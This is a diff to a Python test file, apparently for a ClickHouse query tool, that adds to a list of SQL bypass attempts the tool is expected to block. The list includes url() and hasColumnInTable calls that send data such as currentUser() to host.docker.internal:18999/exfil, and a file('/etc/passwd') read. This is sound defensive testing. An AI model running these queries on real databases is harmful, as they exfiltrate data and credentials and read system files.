@@ -166,6 +166,8 @@ def test_review_bypasses_stay_closed():
         "SELECT * FROM loop(url('http://host.docker.internal:18999/exfil', 'TSV', 'a String'))",
         "SELECT * FROM view(SELECT * FROM url('http://host.docker.internal:18999/exfil', 'TSV', 'a String'))",
         "SELECT file('/etc/passwd')",
+        "SELECT hasColumnInTable('host.docker.internal:18999', (SELECT currentUser()), 'pw', 'system', 'one', 'dummy')",
+        "SELECT arrayMap(x -> hasColumnInTable('host.docker.internal:18999', 'u', 'p', 'system', 'one', 'dummy'), [1])",
         "EXPLAIN PIPELINE INSERT INTO FUNCTION url('http://host.docker.internal:18999/x', 'TSV', 'a String') SELECT 1",
     ]:
         message = error("clickhouse_query", sql=sql)
@@ -176,3 +178,4 @@ def test_review_bypasses_stay_closed():
     assert path["rows"] == [["C:\\new\\table"]]
     assert call("clickhouse_query", sql="SELECT count() FROM numbers(10)")["rows"] == [[10]]
     assert call("clickhouse_query", sql="SELECT format('{}-{}', 'a', 'b') AS f")["rows"] == [["a-b"]]
+    assert call("clickhouse_query", sql="EXPLAIN PIPELINE graph = 1 SELECT 1")["row_count"] > 0
